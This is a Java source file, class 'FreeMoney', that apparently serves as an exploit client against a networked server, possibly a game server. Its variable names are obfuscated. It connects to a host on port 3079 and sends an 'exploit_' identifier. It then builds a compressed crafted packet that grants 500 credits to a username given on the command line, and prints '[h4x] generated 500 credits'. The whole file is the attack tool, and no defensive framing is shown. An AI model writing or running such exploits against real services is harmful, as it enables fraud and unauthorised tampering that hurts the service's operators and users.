import java.io.*;
import java.net.*;
import java.util.zip.Deflater;
import java.security.SecureRandom;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;

public class FreeMoney {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        Socket a = new Socket(args[0], 3079);
        ObjectOutputStream b = new ObjectOutputStream(new BufferedOutputStream(a.getOutputStream()));
        String c = "v2.21";
        String f = args[1];

        SecureRandom g = new SecureRandom();
        byte[] h = new byte[3];
        g.nextBytes(h);
        StringBuilder i = new StringBuilder();
        for (byte j : h) {
            String k = String.format("%02x", j);
            i.append(k);
        }

        String l = i.toString();
        int m = 5;
        int n = 10;
        b.writeObject(c);
        b.writeObject("exploit_"+l);
        b.flush();

        ObjectInputStream o = new ObjectInputStream(new BufferedInputStream(a.getInputStream()));
        boolean p = false;
        try {
            p = o.readBoolean();
        } catch (EOFException q) {
            p = true;
        }
        if (!p) {
            System.out.println("Connection not accepted by the server");
            a.close();
            return;
        }

        System.out.println("[h4x] " + "generated 500 credits for " + args[1]);
        OutputStream r = a.getOutputStream();
        Deflater s = new Deflater();
        String t = "ZEUS"; //"exploit_"+l;
        int u = 500;
        byte v = (byte) args[1].getBytes(StandardCharsets.UTF_8).length;
        byte w = (byte) t.getBytes(StandardCharsets.UTF_8).length;
        ByteBuffer x = ByteBuffer.allocate(1 + 1 + v + 1 + w + 4);

        x.put((byte) 12);
        x.put(v);
        x.put(args[1].getBytes(StandardCharsets.UTF_8));
        x.put(w);
        x.put(t.getBytes(StandardCharsets.UTF_8));
        x.putInt(u);

        s.setInput(x.array());
        s.finish();
        byte[] y = new byte[2048];
        ByteArrayOutputStream z = new ByteArrayOutputStream();
        int aa;
        while ((aa = s.deflate(y)) != 0) {
            z.write(y, 0, aa);
        }
        byte[] ab = z.toByteArray();
        b.writeInt(ab.length);
        b.write(ab);
        b.flush();

        try {
           Thread.sleep(10);
        } catch (InterruptedException ac) {
           ac.printStackTrace();
        }

        s.end();
        a.close();
    }
}

